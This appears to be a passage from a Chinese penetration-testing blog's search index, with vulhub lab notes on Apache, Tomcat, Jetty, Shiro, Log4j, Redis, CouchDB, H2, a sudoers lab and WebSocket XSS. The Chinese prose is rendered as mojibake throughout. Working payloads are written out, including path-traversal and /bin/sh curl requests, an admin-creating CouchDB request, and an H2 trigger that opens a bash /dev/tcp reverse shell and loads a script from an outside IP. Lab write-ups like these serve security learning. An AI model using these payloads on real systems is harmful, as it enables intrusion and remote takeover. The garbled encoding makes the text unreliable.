å‘ç°æˆåŠŸæ‰§è¡Œäº†SSRFå‘½ä»¤ æ¥ä¸‹æ¥å°±å¯ä»¥è¯•è¯•fileæœ¬åœ°è¯»å–å‘½ä»¤äº† Apacheè·¯å¾„ç©¿è¶Š-CVE-2021-41773ç‰ˆæœ¬-2.4.49 è·¯å¾„ç©¿è¶Šcurl -v â€“path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd æ³¨æ„ â€“path-as-is é«˜ç‰ˆæœ¬å¯ä»¥ç”¨ Apacheè·¯å¾„ç©¿è¶Š-CVE-2021-42013â€œApache2.4.50â€ æ³¨æ„curlç‰ˆæœ¬ windowsä¸è¡Œè¯•è¯•linuxçš„ ç»•è¿‡å‰é¢41337çš„è¡¥ä¸ ç‰ˆæœ¬2.4.50 æˆ‘ä»¬æŠ“åŒ…å¯ä»¥çœ‹è§ç‰ˆæœ¬ POCè¯»å–æ–‡ä»¶ curl -v --path-as-is http://123.58.224.8:44467/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd åœ¨æœåŠ¡ç«¯å¼€å¯äº†cgiæˆ–cgidè¿™ä¸¤ä¸ªmodçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´å°†å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š å‘½ä»¤æ‰§è¡Œcurl -v â€“data â€œecho;idâ€ â€˜http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/shâ€˜ é¢fofoè¯•äº†ä¸‹æ²¡ä»€ä¹ˆç”¨ TOMCATTOMCATç»ˆç«¯ç™»å½•å¯†ç  åœ¨é…ç½®æ–‡ä»¶ä¸­é»˜è®¤tomcat tomcat tomcat-users.xml å¼±å£ä»¤å­˜åœ¨é¢æ¿ ä¸Šä¼ WARåŒ…åè®¿é—®åé—¨ ç”Ÿæˆåé—¨åæˆåŠŸå‹ç¼©æ–‡ä»¶æ”¹zipæ ¼å¼ä¸ºwarå³å¯ æˆåŠŸgetshell CVE-2020-1938 AJPæ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥è¯»å– webapp é…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚æ­¤å¤–åœ¨ç›®æ ‡åº”ç”¨æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œé…åˆæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨è¿˜å¯ä»¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„å±å®³ã€‚ Tomcat 6.* Tomcat 7.* 7.0.100 Tomcat 8.* 8.5.51 Tomcat 9.* 9.0.31 è¿™ä¸ªè„šæœ¬ç”¨PY2.7ä½¿ç”¨ TOMCAT RCE CVE-2025-24813https://www.cnblogs.com/smileleooo/p/18772389 éœ€è¦æ»¡è¶³æ¡ä»¶ jettyä¸€ä¸ªå¼€æºçš„servletå®¹å™¨ï¼Œå®ƒä¸ºåŸºäºJavaçš„Webå®¹å™¨æä¾›è¿è¡Œç¯å¢ƒã€‚ CVE-2021-28169å¯¹äº 9.4.40ã€ 10.0.2ã€ 11.0.2çš„Eclipse Jettyç‰ˆæœ¬ï¼Œ curl -v http://123.58.224.8:16187/static?/%2557EB-INF/web.xmlä¸ºä»€ä¹ˆä¸åœ¨urlç›´æ¥ç”¨å› ä¸ºæµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç åŠ è½½å¿…é¡»curl F12å¯ä»¥å‘ç°æ˜¯jetty CVE-2021-34429å¯¹äº9.4.37-9.4.42ã€10.0.1-10.0.5å’Œ11.0.1-11.0.5çš„Eclipse%u002eWEB-INFweb.xml weblogicCVEå¾ˆå¤šç›´æ¥å·¥å…·æ¢­å“ˆ weblogicTool","tags":["vulhub","apache","tomcat","jetty","weblogic"]},{"title":"CVE-java-solr-log4j-shiro","path":"/2025/07/13/posts/CVE-java-solr/","content":"CVE-java-solr-log4j-shiro ä¸»è¦åŸºäºHTTPå’ŒApache Luceneå®ç°çš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚ 8393ç«¯å£ å†å²æ¼æ´ï¼šhttps://avd.aliyun.com/search?q=Solr CVE-2019-17558å‘½ä»¤æ‰§è¡Œç”¨PY2.7æ¥è¿è¡Œè„šæœ¬ CVE-2019-0193-å‘½ä»¤æ‰§è¡ŒApache Solr 8.2.0ç‰ˆæœ¬æ¡ä»¶1ï¼šApache Solrçš„DataImportHandlerå¯ç”¨äº†æ¨¡å—DataImportHandler(é»˜è®¤ä¸ä¼šè¢«å¯ç”¨)æ¡ä»¶2ï¼šSolr Admin UIæœªå¼€å¯é‰´æƒè®¤è¯ã€‚ï¼ˆé»˜è®¤æƒ…å†µæ— éœ€ä»»ä½•è®¤è¯ï¼‰ POCï¼Œç‚¹å‡»Execute with this Confuguration CVE-2024-45216 è®¤è¯ç»•è¿‡GET solradmininfoproperties:admininfokey å‘åŒ…çœ‹è¿”å› SHIRO çœ‹remebermeCVE-2020-11989-ç»•è¿‡éªŒè¯Pocï¼šadmin%20å½±å“èŒƒå›´ï¼šApache Shiro 1.7.1 CVE-2022-32532 ç»•è¿‡é‰´æƒPocï¼š permitany permita%0anyå¯ç»•è¿‡ SHIROååºåˆ— java -jar ysoserial.jar CommonsCollections5 â€œcalc.exeâ€ payload.serç”Ÿæˆ ä½¿ç”¨AESé»˜è®¤å¯†é’¥åŠ å¯† base64åŠ å¯† LOG4JCVE-2021-44228PAYLOADèƒ½æ’å…¥jndiçš„å°±æ’å…¥è¿›å»è¯•è¯• VULNHUBé¶åœº ç”ŸæˆJNDIæ³¨å…¥ æœ¬åœ°ç›‘å¬ åœ¨å‚æ•°ç›´æ¥æ’å…¥è¿›å» æ‹¿åˆ°SHELL ä¸æˆåŠŸå¯èƒ½ï¼š å¯¹æ–¹æ²¡æœ‰log4jLOG4Jç‰ˆæœ¬é«˜JDKç‰ˆæœ¬è¿‡é«˜","tags":["vulhub","apache","shiro","solr","log4j"]},{"title":"CVE-vulfocus-vulhub-redis-couchdb-H2DB","path":"/2025/07/12/posts/CVE-vulfocus-vulhub-redis-couchdb-H2DB/","content":"CVE-vulfocus-vulhub-redis-couchdb-H2DB redis- é«˜æ€§èƒ½å†…å­˜æ•°æ®åº“å…³äºredis æˆ‘ä»¬ç›´æ¥åœ¨vulfocusä¸Šé¢æ‹‰é•œåƒå¹¶ä½¿ç”¨è„šæœ¬æ–‡ä»¶redis-rogue-server-masterå³å¯é€šæ€ é«˜é€Ÿç¼“å­˜ä½œä¸ºæ•°æ®åº“å‰ç«¯ç¼“å­˜ï¼Œå‡å°‘æ•°æ®åº“è®¿é—®å‹åŠ›ã€‚æ¡ˆä¾‹ï¼šç”µå•†é¦–é¡µçƒ­é—¨å•†å“ç¼“å­˜ã€æ–°é—»ç½‘ç«™çƒ­é—¨æ–‡ç« ç¼“å­˜ã€‚ å®æ—¶æ•°æ®å¤„ç†æ”¯æŒé«˜å¹¶å‘è¯»å†™ï¼ˆå•èŠ‚ç‚¹ QPS å¯è¾¾ 10 ä¸‡ +ï¼‰ï¼Œé€‚åˆå®æ—¶ç»Ÿè®¡åœºæ™¯ã€‚æ¡ˆä¾‹ï¼šç›´æ’­é—´åœ¨çº¿äººæ•°ç»Ÿè®¡ã€ç§’æ€æ´»åŠ¨åº“å­˜æ‰£å‡ã€‚ ä¸€èˆ¬æ¥è¯´redisçš„CVEå°±æ˜¯é…ç½®ä¸å½“ bind 127.0.0.1 æ˜¯é»˜è®¤å¼€å¯çš„ ç„¶årequirepassé»˜è®¤ä¸ºç©ºæ„æ€å°±æ˜¯æœ¬åœ°éšä¾¿è¿›å»ä½†æ˜¯ä½ å¦‚æœä¸æƒ³æœ¬åœ°ä½†æ˜¯åˆå¿˜è®°ä¿®æ”¹å¯†ç å°±ä¼šé€ æˆé—®é¢˜ CNCD-2015-07557æ‰“å¼€é¶åœºè®¾ç½®è„šæœ¬çš„ç›®çš„ä¸ºé¶æœºIP ç«¯å£ä»–æŠŠé»˜è®¤ç«¯å£6379æ˜ å°„ä¸º36700 ç›´æ¥è¿è¡Œé€‰æ‹©råå¼¹shell æˆ‘ä»¬å¯¹ç«¯ç›‘å¬å°±å¯ä»¥å‘ç°ç›´æ¥åå¼¹æˆåŠŸæ‹¿ä¸‹äº†æœåŠ¡å™¨ç”¨æˆ·æ˜¯redisè¡¨ç¤ºä»–ä½¿ç”¨redisæ¥å½“ç”¨æˆ· è¿™é‡Œredisçš„CVE CNVDéƒ½èƒ½ç”¨è¿™ä¸ªè„šæœ¬æ¥è¿è¡Œæµ‹è¯• åŸç†å°±æ˜¯æœªæˆæƒåŠ ä¸Šæ¨¡å—çš„æ¶æ„æ‰§è¡Œ ä¸€èˆ¬ä¸ªäººæµ‹æ˜¯ä¸‰æ–¹é¢ å†™å…¥webåé—¨ è¦æ±‚-å¯¹æ–¹æœ‰webæœåŠ¡å™¨ sshå¯†é’¥ç™»å½• è¦æ±‚-rootæƒé™ å¯†é’¥ç™»å½•å…è®¸ å†™å…¥è®¡æ—¶ä»»åŠ¡ è¦æ±‚-rootæƒé™ ç³»ç»Ÿé™åˆ¶ å¦‚centoså¯ä»¥ ubantuå¯èƒ½æœ‰å­—ç¬¦é”™è¯¯ CouchDB-cve_2017_12636-é¢å‘æ–‡æ¡£ã€å¼ºè°ƒåˆ†å¸ƒå¼ä¸€è‡´æ€§CouchDB å†…ç½®å¤šä¸»å¤åˆ¶å’Œå†²çªæ£€æµ‹æœºåˆ¶ï¼Œé€‚åˆç§»åŠ¨åº”ç”¨ã€åä½œå·¥å…·ï¼ˆå¦‚ç¬”è®°åº”ç”¨ï¼‰ç­‰éœ€è¦ç¦»çº¿å·¥ä½œçš„åœºæ™¯ã€‚æ¡ˆä¾‹ï¼šåŒ»ç–—è®°å½•ç³»ç»Ÿï¼ˆåŒ»ç”Ÿåœ¨æ— ç½‘ç»œç¯å¢ƒä¸‹è®¿é—® ä¿®æ”¹æ•°æ®ï¼Œæ¢å¤ç½‘ç»œåè‡ªåŠ¨åŒæ­¥ï¼‰ã€‚ æ–‡æ¡£å‹æ•°æ®ç®¡ç†é€‚åˆå­˜å‚¨ç»“æ„åŒ–ç¨‹åº¦è¾ƒä½çš„æ•°æ®ï¼ˆå¦‚åšå®¢æ–‡ç« ã€äº§å“ç›®å½•ï¼‰ï¼Œæ— éœ€é¢„å®šä¹‰è¡¨ç»“æ„ã€‚æ¡ˆä¾‹ï¼šå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰å­˜å‚¨æ–‡ç« ã€è¯„è®ºç­‰ã€‚ é«˜å¯ç”¨åˆ†å¸ƒå¼ç³»ç»Ÿé€šè¿‡å¤šèŠ‚ç‚¹å¤åˆ¶å®ç°è‡ªåŠ¨æ•…éšœè½¬ç§»ï¼Œé€‚åˆåœ°ç†åˆ†å¸ƒçš„åº”ç”¨ã€‚æ¡ˆä¾‹ï¼šè·¨å›½å…¬å¸çš„åˆ†å¸ƒå¼åŠå…¬ç³»ç»Ÿã€‚ å†å²æ•°æ®è¿½è¸ªæ”¯æŒæ–‡æ¡£ç‰ˆæœ¬æ§åˆ¶ï¼ˆMVCCï¼‰ï¼Œé€‚åˆéœ€è¦å®¡è®¡æ—¥å¿—çš„åœºæ™¯ã€‚æ¡ˆä¾‹ï¼šé‡‘èäº¤æ˜“è®°å½•ç³»ç»Ÿã€‚ ä¿®æ”¹åå¼¹ipç«¯å£ ä½¿ç”¨PYè„šæœ¬è¿è¡Œè¿™é‡Œ CVE-2017-12636æ˜¯ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡config apiä¿®æ”¹couchdbçš„é…ç½®query_serverï¼Œè¿™ä¸ªé…ç½®é¡¹åœ¨è®¾è®¡ã€æ‰§è¡Œviewçš„æ—¶å€™å°†è¢«è¿è¡Œã€‚ CouchDB-CVE-2022-24706åœ¨vulhubä½¿ç”¨docker-compose up -d å¯åŠ¨ç«¯å£ å®ƒé»˜è®¤å¯åŠ¨äº†4369å’Œ æœ¬èº«ç«¯å£ 5984 5984: Apache CouchDB Webç®¡ç†æ¥å£ 4369: Erlangç«¯å£æ˜ å°„æœåŠ¡ï¼ˆepmdï¼‰ 9100: é›†ç¾¤èŠ‚ç‚¹é€šä¿¡å’Œè¿è¡Œæ—¶è‡ªçœæœåŠ¡ï¼ˆä»£ç æ‰§è¡Œå®é™…å‘ç”Ÿåœ¨è¿™ä¸ªç«¯å£ä¸­ï¼‰ è¿™é‡Œåˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªåˆ†å¸ƒå¼ç«¯å£4369 è¿™ä¸ªPOCä¼šå…ˆé€šè¿‡ç›®æ ‡çš„4369ç«¯å£epmdæœåŠ¡è·å–é›†ç¾¤é€šä¿¡çš„ç«¯å£ï¼Œä¹Ÿå°±æ˜¯9100ï¼Œç„¶åå†ä½¿ç”¨é»˜è®¤Cookieæ¥æ§åˆ¶èŠ‚ç‚¹æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ couchdb-cve_2017_12635ä¸Šé¢é‚£ä¸ªCVEå°±æ˜¯åŸºäºè¿™ä¸ªæ¼æ´è¿›è¡Œä»»æ„æ³¨å†Œç›´æ¥æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯ è®¿é—®Get:_utils éœ€è¦ç™»å½•ç”¨æ¼æ´cve_2017_12635 POC æ·»åŠ ç”¨æˆ·user æ˜¯adminç»„çš„ PUT /_users/org.couchdb.user:ç”¨æˆ· HTTP/1.1Host: XX:XXAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108 type: user, name: ç”¨æˆ·, roles: [_admin], roles: [], password: å¯†ç  å†è®¿é—®å¯ä»¥æŸ¥çœ‹æ•°æ®åº“äº† H2database -CVE-2022-23221Java SQL æ•°æ®åº“ H2,H2çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ï¼šéå¸¸å¿«ï¼Œå¼€æºï¼ŒJDBC APIï¼›åµŒå…¥å¼å’ŒæœåŠ¡å™¨æ¨¡å¼ï¼›å†…å­˜æ•°æ®åº“ï¼›åŸºäºæµè§ˆå™¨çš„æ§åˆ¶å°åº”ç”¨ç¨‹åºã€‚H2 æ•°æ®åº“æ§åˆ¶å°ä¸­çš„å¦ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„ RCE æ¼æ´ï¼Œåœ¨v2.1.210+ä¸­ä¿®å¤ã€‚2.1.210 ä¹‹å‰çš„H2æ§åˆ¶å°å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡åŒ…å«å­å­—ç¬¦ä¸²çš„jdbc:h2:mem JDBC URLæ‰§è¡Œä»»æ„ä»£ç ã€‚ è¾“å…¥åç›´æ¥è¿›å…¥è¯»å–æ–‡ä»¶äº† æ‹¿åˆ°SHELLæ­¥éª¤ è¿›å…¥ååœ¨ä½ å…¬ç½‘ä¸»æœºåˆ›å»ºæ•°æ®åº“æ–‡ä»¶å¹¶ä¸”ç›‘å¬æ‰“å¼€pythonæœåŠ¡ CREATE TABLE test ( id INT NOT NULL );CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS //javascriptJava.type(java.lang.Runtime).getRuntime().exec(bash -c echo,åå¼¹çš„base64è¾“å…¥|base64,-d|bash,-i);;bash -i /dev/tcp/x.x.x.x/5566 01 åˆ›å»ºsqlæ–‡ä»¶èƒ½è®¿é—®åé€€å‡ºé¦–é¡µå†æ¬¡è¾“å…¥ jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM http://116.62.32.64:8000/123.sql;\\ NCç›‘å¬å¯¹åº”sqlæ–‡ä»¶çš„ç«¯å£å¾—åˆ°SHELL æ€»ç»“ä»–ä»¬æ•°æ®åº“å’Œmysqlå…³ç³»æ€§çš„åŒºåˆ« MySQL æ˜¯ â€œç³»ç»Ÿçš„æ ¸å¿ƒè´¦æœ¬â€ï¼Œé€‚åˆå­˜å‚¨ç»“æ„åŒ–ã€éœ€è¦å¼ºäº‹åŠ¡ä¿è¯çš„æ ¸å¿ƒä¸šåŠ¡æ•°æ®ï¼ˆå¦‚è®¢å•ã€æ”¯ä»˜è®°å½•ï¼‰ï¼› CouchDB æ˜¯ â€œçµæ´»çš„æ–‡æ¡£ä»“åº“â€ï¼Œé€‚åˆå­˜å‚¨ç»“æ„å¤šå˜ã€éœ€è¦åˆ†å¸ƒå¼åŒæ­¥çš„æ–‡æ¡£æ•°æ®ï¼ˆå¦‚åšå®¢æ–‡ç« ã€ç¦»çº¿åº”ç”¨æ•°æ®ï¼‰ï¼› Redis æ˜¯ â€œé«˜é€Ÿæ•°æ®ä¸­è½¬ç«™â€ï¼Œæ ¸å¿ƒä»·å€¼ä¹‹ä¸€æ˜¯ä½œä¸ºç¼“å­˜ï¼Œé€šè¿‡å†…å­˜å­˜å‚¨é«˜é¢‘æ•°æ®ï¼Œè§£å†³æ•°æ®åº“æ€§èƒ½ç“¶é¢ˆã€‚ ä¸‰è€…å¹¶éæ›¿ä»£å…³ç³»ï¼Œå®é™…ä¸šåŠ¡ä¸­å¸¸ç»“åˆä½¿ç”¨ï¼ˆä¾‹å¦‚ï¼šMySQL å­˜è®¢å•ï¼ŒRedis ç¼“å­˜è®¢å•åˆ—è¡¨ï¼ŒCouchDB å­˜ç”¨æˆ·ç”Ÿæˆçš„åŠ¨æ€å†…å®¹ï¼‰ã€‚ redisç¼“å­˜ï¼š è€Œ Redis åŸºäºå†…å­˜å­˜å‚¨ï¼Œè¯»å†™é€Ÿåº¦æå¿«ï¼Œä¸”æ”¯æŒå¤æ‚æ•°æ®ç»“æ„ï¼Œéå¸¸é€‚åˆä½œä¸º â€œä¸­é—´å±‚ç¼“å­˜â€ï¼Œè®©é«˜é¢‘æ•°æ®ç›´æ¥ä» Redis è¯»å–ï¼Œè€Œéæ¯æ¬¡éƒ½è®¿é—®æ•°æ®åº“ã€‚","tags":["vulhub","redis","couchdb","vulfocus"]},{"title":"sudoé¶æœº---éš¾åº¦lowçŸ¥è¯†ç‚¹-çˆ†ç ´-sudoers","path":"/2025/07/12/posts/sudo/","content":"sudoé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-çˆ†ç ´-sudoers Nmapæ‰«æå‘ç°å¸¸è§„ç«¯å£ 80å’Œ22è®¿é—®80çœ‹çœ‹ è¿™é‡Œæˆ‘ç›´æ¥çˆ†ç ´äº†-è¿™é‡ŒåŠ«æŒåˆ°åå‘é€åˆ°repeterè¿™é‡Œçš„tokenæ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨çš„æ„Ÿè§‰ çˆ†ç ´å¯†ç æ˜¯admin@123 è¿™é‡Œçˆ†ç ´åä½ å›æ¥è¿”å›ä¼šå‘ç°è‡ªåŠ¨è·³è½¬äº† æˆ‘åé¢æµ‹è¯•è¿™ä¸ªtokenä¸ç®¡å°±è¡Œä½ repeterè¾“å…¥å®Œä¹Ÿæ˜¯è‡ªåŠ¨è·³è½¬ä¸¤ä¸ªtokenä¸ä¸€æ ·éƒ½è¡Œ è¿›å»åä¸Šä¼ æ–‡ä»¶- æ‰§è¡Œè·å¾—shell è¿™é‡Œå¯†ç å…¶å®åœ¨readme.mdé‡Œé¢äº†æˆ‘æ²¡çœ‹åˆ°. æ‹¿åˆ°shellæƒé™ ä¸Šä¼ linpeasæ‰«æå‘ç°suidæ–‡ä»¶ è¯»å–shadowè¯•è¯• johnä¸€ä¸‹ æ‹¿rootè¿›å…¥eechoç”¨æˆ·åå‘ç°æ²¡æœ‰sudo -l åªæœ‰è¿™ä¸ªè¯»å–æ–‡ä»¶åˆ©ç”¨è¯»å–ä¸‹ sudoersè¿™é‡Œå‘ç°äº†å¯ä»¥æœ‰ä¸€ä¸ªä½†æ˜¯è¦ä¸»æœºåæ˜¯dashaziæˆ‘ä»¬å°±ä»¥ä¸»æœºåæ˜¯dashaziæ¥è¿è¡Œå°±è¡Œ ä¸ä¼šå‘½ä»¤å°±AI åå¼¹SHELL æ€»ç»“ä¸€ä¸‹1ï¼šé…ç½®æ–‡ä»¶å¤šçœ‹çœ‹","tags":["çˆ†ç ´","sudoers"]},{"title":"websocket-messages-to-exploit-vulnerabilities","path":"/2025/07/11/posts/PortSwigger-websocket-WebSocket-messages-to-exploit/","content":"bpé¶åœºâ€”websocket-messages to exploit vulnerabilities WebSocket æ˜¯ä¸€ç§åœ¨**å•ä¸ª TCP è¿æ¥ä¸Šè¿›è¡Œå…¨åŒå·¥é€šä¿¡**çš„åè®®ï¼Œå…è®¸å®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨ï¼‰å’ŒæœåŠ¡å™¨ä¹‹é—´å®æ—¶äº¤æ¢æ•°æ®ï¼Œæ— éœ€é¢‘ç¹çš„ HTTP è¯·æ±‚ã€‚å®ƒå½»åº•æ”¹å˜äº† Web åº”ç”¨çš„å®æ—¶æ€§ä½“éªŒï¼Œå¹¿æ³›åº”ç”¨äºèŠå¤©ã€å®æ—¶æ•°æ®ç›‘æ§ã€åœ¨çº¿æ¸¸æˆç­‰åœºæ™¯ã€‚æ˜¯ä¸€ä¸ªåº”ç”¨å±‚åè®® åè®®å¼€å¤´ws(http)æˆ–è€…wss(https) BPä»‹ç»BURPæ˜¯å¯ä»¥æŠ“å–websocketæ•°æ®çš„ å¯ä»¥å‘ç°æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆæˆ‘ä»¬å‘é€æœåŠ¡å™¨ æœåŠ¡å™¨å‘é€æ•°æ®å›æ¥è¿›è¡Œå®æ—¶äº¤äº’ F12ä¹Ÿå¯ä»¥çœ‹æ•°æ®å‘é€ å®éªŒè¿™é‡Œè¦æ±‚æˆ‘ä»¬æ³¨å…¥xss è¾“å…¥è¯•è¯• - å‘ç°ä¸è¡Œ åŸæ¥æ˜¯è¿›è¡Œäº†è¿‡æ»¤æˆ‘ä»¬ä¿®æ”¹æŠ“åŒ…è¯•è¯• å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„TYPEä¸æ˜¯HTTPæ˜¯WS å®ƒä»¬ç›¸äº’é…åˆå®Œæˆæ•ˆæœ æˆåŠŸ æ€»ç»“ä¸€ä¸‹websocketæŠ€æœ¯æ˜¯ä¸€ä¸ªå®æ—¶äº¤äº’æŠ€æœ¯ ä»–å’Œ HTTPåŒºåˆ«æœ‰å—ï¼Ÿ HTTP åè®®çš„ â€œç¡¬ä¼¤â€ï¼šæ— æ³•æ»¡è¶³å®æ—¶äº¤äº’çš„æ ¸å¿ƒéœ€æ±‚â€‹\tHTTP æ˜¯ â€œè¯·æ±‚ - å“åº”â€ æ¨¡å¼çš„åè®®ï¼Œå³ä½¿é€šè¿‡æŠ€æœ¯æ‰‹æ®µ â€œä¿æŒè¿æ¥â€ï¼ˆå¦‚ HTTP1.1 çš„ Connection: keep-alive æŒä¹…è¿æ¥ï¼‰ï¼Œä¹Ÿæ— æ³•çªç ´å…¶æœ¬è´¨é™åˆ¶ï¼š é€šä¿¡æ–¹å‘å—é™ï¼šæœåŠ¡å™¨ä¸èƒ½ä¸»åŠ¨å‘æ•°æ®HTTP ä¸­ï¼Œåªæœ‰å®¢æˆ·ç«¯ä¸»åŠ¨å‘é€è¯·æ±‚ï¼ˆRequestï¼‰ï¼ŒæœåŠ¡å™¨æ‰èƒ½è¢«åŠ¨å›åº”ï¼ˆResponseï¼‰ã€‚æœåŠ¡å™¨æ°¸è¿œæ— æ³• â€œä¸»åŠ¨â€ å‘å®¢æˆ·ç«¯æ¨é€æ•°æ® â€”â€” è¿™æ˜¯å®æ—¶äº¤äº’ï¼ˆå¦‚èŠå¤©ã€å®æ—¶ç›‘æ§ï¼‰çš„æ ¸å¿ƒéšœç¢ã€‚ ä¾‹å¦‚ï¼šå¦‚æœç”¨ HTTP åšèŠå¤©è½¯ä»¶ï¼ŒA ç»™ B å‘æ¶ˆæ¯åï¼ŒæœåŠ¡å™¨æ— æ³•ä¸»åŠ¨é€šçŸ¥ B â€œæœ‰æ–°æ¶ˆæ¯â€ï¼ŒB å¿…é¡»ä¸æ–­æ‰‹åŠ¨åˆ·æ–°ï¼ˆæˆ–å®¢æˆ·ç«¯å®šæ—¶å‘è¯·æ±‚ï¼‰æ‰èƒ½æ”¶åˆ°ï¼Œä½“éªŒæå·®ã€‚ â€œä¿æŒè¿æ¥â€ ä¸ç­‰äº â€œå®æ—¶åŒå‘é€šä¿¡â€HTTP1.1 çš„ keep-alive ç¡®å®èƒ½è®© TCP è¿æ¥å¤ç”¨ï¼ˆé¿å…æ¯æ¬¡è¯·æ±‚é‡æ–°æ¡æ‰‹ï¼‰ï¼Œä½†è¿æ¥çš„æ§åˆ¶æƒä»åœ¨å®¢æˆ·ç«¯ï¼š å®¢æˆ·ç«¯ä¸å‘è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•åˆ©ç”¨è¿™ä¸ªè¿æ¥ â€œä¸»åŠ¨è¯´è¯â€ï¼› è¿æ¥çš„è¶…æ—¶æ—¶é—´ç”±æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯æ§åˆ¶ï¼ˆé€šå¸¸å‡ ç§’åˆ°å‡ åˆ†é’Ÿï¼‰ï¼Œåˆ°æœŸåä¼šè‡ªåŠ¨æ–­å¼€ï¼Œæ— æ³• â€œæ°¸ä¹…ä¿æŒâ€ã€‚ è½®è¯¢ é•¿è½®è¯¢çš„ä½æ•ˆæ€§ä¸ºäº†æ¨¡æ‹Ÿ â€œå®æ—¶æ€§â€ï¼ŒHTTP åœºæ™¯ä¸‹å¸¸é‡‡ç”¨ä¸¤ç§å¦¥åæ–¹æ¡ˆï¼Œä½†éƒ½æœ‰æ˜æ˜¾ç¼ºé™·ï¼š è½®è¯¢ ï¼šå®¢æˆ·ç«¯æ¯éš”å‡ ç§’å‘ä¸€æ¬¡è¯·æ±‚ï¼ˆå¦‚ â€œæœ‰æ–°æ¶ˆæ¯å—ï¼Ÿâ€ï¼‰ï¼ŒæœåŠ¡å™¨å›å¤ â€œæœ‰ æ²¡æœ‰â€ã€‚ é—®é¢˜ï¼šå¤§é‡æ— æ•ˆè¯·æ±‚ï¼ˆæ¯”å¦‚ 90% çš„è¯·æ±‚éƒ½æ˜¯ â€œæ²¡æœ‰æ–°æ¶ˆæ¯â€ï¼‰ï¼Œæµªè´¹å¸¦å®½å’ŒæœåŠ¡å™¨èµ„æºï¼›å»¶è¿Ÿé«˜ï¼ˆè‡³å°‘ç­‰äºè½®è¯¢é—´éš”ï¼‰ã€‚ é•¿è½®è¯¢ ï¼šå®¢æˆ·ç«¯å‘è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¸ç«‹å³å›å¤ï¼Œè€Œæ˜¯ â€œæŒ‚èµ·â€ è¯·æ±‚ï¼Œç›´åˆ°æœ‰æ•°æ®æ—¶æ‰å“åº”ï¼ˆæˆ–è¶…æ—¶åå›å¤ç©ºï¼‰ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°åç«‹åˆ»å†å‘æ–°è¯·æ±‚ã€‚ é—®é¢˜ï¼šæœåŠ¡å™¨éœ€è¦ç»´æŒå¤§é‡ â€œæŒ‚èµ·çš„è¯·æ±‚â€ï¼Œæ¶ˆè€—å†…å­˜ï¼›è¶…æ—¶æœºåˆ¶ä»ä¼šå¯¼è‡´å»¶è¿Ÿï¼›æœ¬è´¨è¿˜æ˜¯å®¢æˆ·ç«¯ â€œè¢«åŠ¨ç­‰å¾…â€ï¼Œè€ŒéæœåŠ¡å™¨ â€œä¸»åŠ¨æ¨é€â€ã€‚ websocketâ€”â€“ äºŒã€WebSocket çš„æ ¸å¿ƒä»·å€¼ï¼šè§£å†³ HTTP çš„ â€œè¢«åŠ¨æ€§â€WebSocket æ­£æ˜¯ä¸ºè§£å†³ä¸Šè¿°é—®é¢˜è€Œç”Ÿï¼Œå®ƒçš„è®¾è®¡ç›´æ¥ç„å‡† â€œå®æ—¶åŒå‘é€šä¿¡â€ï¼š å…¨åŒå·¥é€šä¿¡ï¼šæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¯éšæ—¶äº’å‘æ•°æ®WebSocket è¿æ¥å»ºç«‹åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ°ä½å¹³ç­‰ â€”â€” åŒæ–¹å¯ä»¥åœ¨ä»»ä½•æ—¶å€™ä¸»åŠ¨å‘å¯¹æ–¹å‘é€æ•°æ®ï¼Œæ— éœ€ç­‰å¾…å¯¹æ–¹è¯·æ±‚ã€‚ ä¾‹å¦‚ï¼šèŠå¤©åœºæ™¯ä¸­ï¼ŒA å‘æ¶ˆæ¯åï¼ŒæœåŠ¡å™¨å¯ç«‹å³é€šè¿‡ WebSocket ä¸»åŠ¨æ¨é€ç»™ Bï¼ŒB æ— éœ€ä»»ä½•æ“ä½œå°±èƒ½å®æ—¶æ”¶åˆ°ã€‚ ä¸€æ¬¡æ¡æ‰‹ï¼Œæ°¸ä¹…è¿æ¥ï¼ˆæŒ‰éœ€ï¼‰WebSocket 